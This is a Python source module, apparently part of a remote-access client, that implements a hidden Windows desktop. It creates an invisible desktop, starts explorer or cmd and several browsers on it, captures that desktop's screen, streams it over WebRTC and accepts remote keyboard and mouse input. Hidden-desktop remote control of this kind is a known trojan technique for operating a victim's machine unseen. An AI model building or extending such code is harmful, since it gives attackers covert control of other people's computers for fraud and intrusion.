"""Hidden desktop helpers for Windows manage sessions."""
from __future__ import annotations

import ctypes
from ctypes import wintypes
from fractions import Fraction
import logging
import os
import platform
import queue
import shutil
import subprocess
import tempfile
import threading
import time
import uuid

from aiortc import VideoStreamTrack
from av import VideoFrame

from remote_client.control.input_controller import ControlCommand, InputController
from remote_client.media.stream_profiles import AdaptiveStreamProfile


logger = logging.getLogger(__name__)
VIDEO_TIME_BASE = Fraction(1, 90000)

CHROMIUM_APPS = {"chrome", "brave", "opera", "edge", "yandex"}
APP_EXECUTABLES = {
    "chrome": ["chrome.exe"],
    "brave": ["brave.exe", "brave-browser.exe"],
    "opera": ["opera.exe", "launcher.exe"],
    "edge": ["msedge.exe"],
    "yandex": ["browser.exe"],
    "firefox": ["firefox.exe"],
}
APP_PATHS = {
    "chrome": [
        os.path.join(base, "Google", "Chrome", "Application", "chrome.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
        if base
    ],
    "brave": [
        os.path.join(base, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
        if base
    ],
    "opera": [
        os.path.join(base, "Opera", "launcher.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"))
        if base
    ]
    + [
        os.path.join(base, "Programs", "Opera", "launcher.exe")
        for base in (os.getenv("LocalAppData"),)
        if base
    ],
    "edge": [
        os.path.join(base, "Microsoft", "Edge", "Application", "msedge.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
        if base
    ],
    "yandex": [
        os.path.join(base, "Yandex", "YandexBrowser", "Application", "browser.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
        if base
    ],
    "firefox": [
        os.path.join(base, "Mozilla Firefox", "firefox.exe")
        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
        if base
    ],
}


def _resolve_app_executable(app_name: str) -> str | None:
    for exe_name in APP_EXECUTABLES.get(app_name, []):
        found = shutil.which(exe_name)
        if found:
            return found
    for candidate in APP_PATHS.get(app_name, []):
        if candidate and os.path.isfile(candidate):
            return candidate
    return None



if platform.system() == "Windows":
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
else:
    user32 = None
    gdi32 = None


DESKTOP_READOBJECTS = 0x0001
DESKTOP_CREATEWINDOW = 0x0002
DESKTOP_WRITEOBJECTS = 0x0080
DESKTOP_SWITCHDESKTOP = 0x0100
DESKTOP_ACCESS = (
    DESKTOP_READOBJECTS
    | DESKTOP_CREATEWINDOW
    | DESKTOP_WRITEOBJECTS
    | DESKTOP_SWITCHDESKTOP
)

SRCCOPY = 0x00CC0020
CAPTUREBLT = 0x40000000
DIB_RGB_COLORS = 0
BI_RGB = 0

SM_CXSCREEN = 0
SM_CYSCREEN = 1
UOI_NAME = 2


if user32:
    user32.CreateDesktopW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        ctypes.c_void_p,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.c_void_p,
    ]
    user32.CreateDesktopW.restype = wintypes.HANDLE
    user32.CloseDesktop.argtypes = [wintypes.HANDLE]
    user32.CloseDesktop.restype = wintypes.BOOL
    user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    user32.SetThreadDesktop.restype = wintypes.BOOL
    user32.GetProcessWindowStation.restype = wintypes.HANDLE
    user32.GetUserObjectInformationW.argtypes = [
        wintypes.HANDLE,
        wintypes.INT,
        wintypes.LPVOID,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    user32.GetUserObjectInformationW.restype = wintypes.BOOL


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", wintypes.DWORD),
        ("biWidth", wintypes.LONG),
        ("biHeight", wintypes.LONG),
        ("biPlanes", wintypes.WORD),
        ("biBitCount", wintypes.WORD),
        ("biCompression", wintypes.DWORD),
        ("biSizeImage", wintypes.DWORD),
        ("biXPelsPerMeter", wintypes.LONG),
        ("biYPelsPerMeter", wintypes.LONG),
        ("biClrUsed", wintypes.DWORD),
        ("biClrImportant", wintypes.DWORD),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]


class POINT(ctypes.Structure):
    _fields_ = [("x", wintypes.LONG), ("y", wintypes.LONG)]


class CURSORINFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("hCursor", wintypes.HCURSOR),
        ("ptScreenPos", POINT),
    ]


def _create_desktop(name: str) -> wintypes.HANDLE:
    if not user32:
        raise RuntimeError("Hidden desktop is only supported on Windows.")
    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, None)
    if not handle:
        raise ctypes.WinError()
    return handle


def _close_desktop(handle: wintypes.HANDLE) -> None:
    if user32 and handle:
        user32.CloseDesktop(handle)


def _set_thread_desktop(handle: wintypes.HANDLE) -> bool:
    if not user32:
        return False
    if not user32.SetThreadDesktop(handle):
        error_code = ctypes.get_last_error()
        logger.warning("SetThreadDesktop failed: %s", ctypes.WinError(error_code))
        return False
    return True


def _get_screen_size() -> tuple[int, int]:
    if not user32:
        return 1280, 720
    width = user32.GetSystemMetrics(SM_CXSCREEN)
    height = user32.GetSystemMetrics(SM_CYSCREEN)
    return int(width), int(height)


def _format_win_error(stage: str) -> str:
    error_code = ctypes.get_last_error()
    return f"{stage} failed (winerror={error_code}): {ctypes.WinError(error_code)}"


def _get_window_station_name() -> str | None:
    if not user32:
        return None
    handle = user32.GetProcessWindowStation()
    if not handle:
        return None
    needed = wintypes.DWORD()
    user32.GetUserObjectInformationW(handle, UOI_NAME, None, 0, ctypes.byref(needed))
    if needed.value == 0:
        return None
    buffer = ctypes.create_unicode_buffer(needed.value)
    if not user32.GetUserObjectInformationW(
        handle, UOI_NAME, buffer, needed, ctypes.byref(needed)
    ):
        return None
    return buffer.value


def _resolve_desktop_path(name: str) -> str:
    winsta = _get_window_station_name()
    if winsta:
        return f"{winsta}\\{name}"
    return f"WinSta0\\{name}"


def _capture_frame(width: int, height: int) -> tuple[object | None, str | None]:
    if not user32 or not gdi32:
        return None, "win32_capture_unavailable"
    if width <= 0 or height <= 0:
        return None, f"invalid_frame_size {width}x{height}"
    hwnd = user32.GetDesktopWindow()
    if not hwnd:
        return None, _format_win_error("GetDesktopWindow")
    hdc = user32.GetDC(hwnd)
    if not hdc:
        return None, _format_win_error("GetDC")
    memdc = gdi32.CreateCompatibleDC(hdc)
    if not memdc:
        user32.ReleaseDC(hwnd, hdc)
        return None, _format_win_error("CreateCompatibleDC")
    bmp = gdi32.CreateCompatibleBitmap(hdc, width, height)
    if not bmp:
        user32.ReleaseDC(hwnd, hdc)
        gdi32.DeleteDC(memdc)
        return None, _format_win_error("CreateCompatibleBitmap")
    gdi32.SelectObject(memdc, bmp)
    if not gdi32.BitBlt(
        memdc,
        0,
        0,
        width,
        height,
        hdc,
        0,
        0,
        SRCCOPY | CAPTUREBLT,
    ):
        err = _format_win_error("BitBlt")
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(memdc)
        user32.ReleaseDC(hwnd, hdc)
        return None, err

    info = BITMAPINFO()
    info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    info.bmiHeader.biWidth = width
    info.bmiHeader.biHeight = -height
    info.bmiHeader.biPlanes = 1
    info.bmiHeader.biBitCount = 32
    info.bmiHeader.biCompression = BI_RGB
    buffer_size = width * height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    if not gdi32.GetDIBits(memdc, bmp, 0, height, buffer, ctypes.byref(info), DIB_RGB_COLORS):
        err = _format_win_error("GetDIBits")
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(memdc)
        user32.ReleaseDC(hwnd, hdc)
        return None, err

    gdi32.DeleteObject(bmp)
    gdi32.DeleteDC(memdc)
    user32.ReleaseDC(hwnd, hdc)

    try:
        import numpy as np
    except Exception as exc:
        return None, f"numpy_import_failed: {exc}"

    frame = np.frombuffer(buffer, dtype=np.uint8).reshape((height, width, 4))
    return frame[:, :, :3], None


class _CursorDrawer:
    def __init__(self) -> None:
        self._cursor_info = CURSORINFO()
        self._cursor_info.cbSize = ctypes.sizeof(CURSORINFO)
        self._get_cursor_info = user32.GetCursorInfo if user32 else None
        self._showing_flag = 0x00000001

    def draw(self, img) -> None:
        if not self._get_cursor_info:
            return
        self._cursor_info.cbSize = ctypes.sizeof(self._cursor_info)
        if not self._get_cursor_info(ctypes.byref(self._cursor_info)):
            return
        if not (self._cursor_info.flags & self._showing_flag):
            return
        x = int(self._cursor_info.ptScreenPos.x)
        y = int(self._cursor_info.ptScreenPos.y)
        height, width = img.shape[:2]
        if x < 0 or y < 0 or x >= width or y >= height:
            return
        _draw_cross(img, x, y)


def _draw_cross(img, x: int, y: int) -> None:
    height, width = img.shape[:2]
    size = 7
    _draw_cross_lines(img, x, y, size, (0, 0, 0), thickness=3, width=width, height=height)
    _draw_cross_lines(img, x, y, size, (255, 255, 255), thickness=1, width=width, height=height)


def _draw_cross_lines(
    img,
    x: int,
    y: int,
    size: int,
    color,
    thickness: int,
    width: int,
    height: int,
) -> None:
    half = thickness // 2
    for offset in range(-half, half + 1):
        y_line = y + offset
        if 0 <= y_line < height:
            x_start = max(0, x - size)
            x_end = min(width - 1, x + size)
            img[y_line, x_start : x_end + 1] = color
        x_line = x + offset
        if 0 <= x_line < width:
            y_start = max(0, y - size)
            y_end = min(height - 1, y + size)
            img[y_start : y_end + 1, x_line] = color


class HiddenDesktopCapture:
    def __init__(self, desktop_handle: wintypes.HANDLE, draw_cursor: bool = True, fps: int = 30) -> None:
        self._desktop_handle = desktop_handle
        self._draw_cursor = draw_cursor
        self._cursor_lock = threading.Lock()
        self._interval_lock = threading.Lock()
        self._interval = 1.0 / max(1, fps)
        self._stop_event = threading.Event()
        self._queue: queue.Queue = queue.Queue(maxsize=1)
        self._frame_size = _get_screen_size()
        self._cursor_drawer = _CursorDrawer() if draw_cursor else None
        self._last_error: str | None = None
        self._failure_count = 0
        self._last_error_log = 0.0
        self._first_frame_logged = False
        self._thread = threading.Thread(target=self._run, name="HiddenDesktopCapture", daemon=True)
        self._thread.start()

    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size

    def set_fps(self, fps: int) -> None:
        if fps <= 0:
            return
        with self._interval_lock:
            self._interval = 1.0 / max(1, fps)

    def set_draw_cursor(self, enabled: bool) -> None:
        with self._cursor_lock:
            self._draw_cursor = bool(enabled)
            self._cursor_drawer = _CursorDrawer() if self._draw_cursor else None

    def _get_interval(self) -> float:
        with self._interval_lock:
            return self._interval

    def _run(self) -> None:
        if not _set_thread_desktop(self._desktop_handle):
            self._last_error = "SetThreadDesktop failed"
            return
        while not self._stop_event.is_set():
            frame, error = _capture_frame(*self._frame_size)
            if frame is not None:
                with self._cursor_lock:
                    drawer = self._cursor_drawer
                if drawer:
                    drawer.draw(frame)
            if frame is not None:
                if not self._first_frame_logged:
                    logger.info("Hidden desktop capture started (%sx%s).", *self._frame_size)
                    self._first_frame_logged = True
                self._failure_count = 0
                self._last_error = None
                self._put_latest(frame)
            else:
                self._failure_count += 1
                if error:
                    self._last_error = error
                    now = time.monotonic()
                    if self._failure_count == 1 or now - self._last_error_log > 5.0:
                        logger.warning("Hidden desktop capture failed: %s", error)
                        self._last_error_log = now
            if self._stop_event.wait(self._get_interval()):
                break

    def _put_latest(self, frame) -> None:
        try:
            self._queue.put_nowait(frame)
        except queue.Full:
            try:
                self._queue.get_nowait()
            except queue.Empty:
                pass
            try:
                self._queue.put_nowait(frame)
            except queue.Full:
                pass

    def get_frame(self, timeout: float) -> object | None:
        try:
            return self._queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def get_last_error(self) -> str | None:
        return self._last_error

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=2)


class HiddenDesktopTrack(VideoStreamTrack):
    def __init__(self, frame_source: HiddenDesktopCapture) -> None:
        super().__init__()
        import numpy as np

        self._np = np
        self._frame_source = frame_source
        self._frame_size = frame_source.frame_size
        self._native_size = self._frame_size
        self._profile = AdaptiveStreamProfile(self._native_size, "balanced")
        self._frame_source.set_fps(self._profile.target_fps)
        self._last_frame_ts: float | None = None
        self._start_time = time.monotonic()

    def set_profile(
        self,
        profile: str | None = None,
        width: int | None = None,
        height: int | None = None,
        fps: int | None = None,
    ) -> None:
        """Update stream scaling based on a named profile or dimensions."""
        self._profile.apply_profile(profile=profile, width=width, height=height, fps=fps)
        self._frame_source.set_fps(self._profile.target_fps)

    def set_draw_cursor(self, enabled: bool) -> None:
        self._frame_source.set_draw_cursor(enabled)

    def _maybe_adjust_profile(self, processing_time: float) -> None:
        fps_changed = self._profile.maybe_adjust(processing_time)
        if fps_changed:
            self._frame_source.set_fps(self._profile.target_fps)

    async def recv(self) -> VideoFrame:
        if self._last_frame_ts is not None and self._profile.target_fps:
            elapsed = time.monotonic() - self._last_frame_ts
            if elapsed > 0:
                self._profile.add_fps_sample(elapsed)
        capture_start = time.monotonic()
        frame = self._frame_source.get_frame(timeout=1.0)
        if frame is None:
            width, height = self._frame_size
            frame = self._np.zeros((height, width, 3), dtype=self._np.uint8)
        video = VideoFrame.from_ndarray(frame, format="bgr24")
        target_width, target_height = self._profile.target_size
        if video.width != target_width or video.height != target_height:
            video = video.reformat(width=target_width, height=target_height)
        processing_time = time.monotonic() - capture_start
        self._maybe_adjust_profile(processing_time)
        self._last_frame_ts = time.monotonic()
        video.pts = int((self._last_frame_ts - self._start_time) * 90000)
        video.time_base = VIDEO_TIME_BASE
        return video


class HiddenDesktopInputController:
    def __init__(self, desktop_handle: wintypes.HANDLE) -> None:
        self._desktop_handle = desktop_handle
        self._queue: queue.Queue[ControlCommand | None] = queue.Queue()
        self._stop_event = threading.Event()
        self._thread = threading.Thread(target=self._run, name="HiddenDesktopInput", daemon=True)
        self._thread.start()

    def _run(self) -> None:
        if not _set_thread_desktop(self._desktop_handle):
            return
        controller = InputController()
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue
            if command is None:
                break
            controller.execute(command)

    def execute(self, command: ControlCommand) -> None:
        if not self._stop_event.is_set():
            self._queue.put(command)

    def close(self) -> None:
        self._stop_event.set()
        try:
            self._queue.put_nowait(None)
        except queue.Full:
            pass
        if self._thread.is_alive():
            self._thread.join(timeout=2)


class HiddenDesktopSession:
    def __init__(self, name: str | None = None, start_shell: bool = True) -> None:
        if platform.system() != "Windows":
            raise RuntimeError("Hidden desktop is only supported on Windows.")
        self.name = name or f"rc_hidden_{uuid.uuid4().hex[:8]}"
        self._desktop_path = _resolve_desktop_path(self.name)
        self._handle = _create_desktop(self.name)
        logger.info("Hidden desktop created: %s", self._desktop_path)
        self._processes: list[subprocess.Popen] = []
        self._profile_dirs: dict[str, str] = {}
        if start_shell:
            self._start_shell()
        self._capture = HiddenDesktopCapture(self._handle, draw_cursor=True)
        self._input = HiddenDesktopInputController(self._handle)
        self.screen_track = HiddenDesktopTrack(self._capture)
        self.input_controller = self._input

    @staticmethod
    def is_supported() -> bool:
        return platform.system() == "Windows"

    def _start_shell(self) -> None:
        try:
            startup = subprocess.STARTUPINFO()
            startup.lpDesktop = self._desktop_path
            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startup.wShowWindow = 1
            self._processes.append(subprocess.Popen("explorer.exe", startupinfo=startup))
        except Exception as exc:
            logger.warning("Failed to start explorer on hidden desktop: %s", exc)
            try:
                startup = subprocess.STARTUPINFO()
                startup.lpDesktop = self._desktop_path
                startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startup.wShowWindow = 1
                self._processes.append(subprocess.Popen("cmd.exe", startupinfo=startup))
            except Exception as cmd_exc:
                logger.warning("Failed to start cmd on hidden desktop: %s", cmd_exc)

    def _ensure_profile_dir(self, app_name: str) -> str:
        existing = self._profile_dirs.get(app_name)
        if existing:
            return existing
        base_dir = os.path.join(tempfile.gettempdir(), "rc_hidden_profiles")
        os.makedirs(base_dir, exist_ok=True)
        profile_dir = os.path.join(base_dir, f"{app_name}_{uuid.uuid4().hex[:8]}")
        os.makedirs(profile_dir, exist_ok=True)
        self._profile_dirs[app_name] = profile_dir
        return profile_dir

    def launch_application(self, app_name: str) -> None:
        normalized = (app_name or "").strip().lower()
        if normalized not in APP_EXECUTABLES:
            raise ValueError(f"Unsupported application '{app_name}'.")
        executable = _resolve_app_executable(normalized)
        if not executable:
            raise FileNotFoundError(f"Executable for '{normalized}' not found.")
        profile_dir = self._ensure_profile_dir(normalized)
        if normalized in CHROMIUM_APPS:
            args = [
                executable,
                f"--user-data-dir={profile_dir}",
                "--new-window",
                "--no-first-run",
                "--no-default-browser-check",
            ]
        else:
            args = [
                executable,
                "-profile",
                profile_dir,
                "-no-remote",
            ]
        startup = subprocess.STARTUPINFO()
        startup.lpDesktop = self._desktop_path
        startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startup.wShowWindow = 1
        process = subprocess.Popen(
            args,
            startupinfo=startup,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._processes.append(process)

    def close(self) -> None:
        self._capture.close()
        self._input.close()
        for proc in self._processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    continue
        for profile_dir in self._profile_dirs.values():
            shutil.rmtree(profile_dir, ignore_errors=True)
        _close_desktop(self._handle)
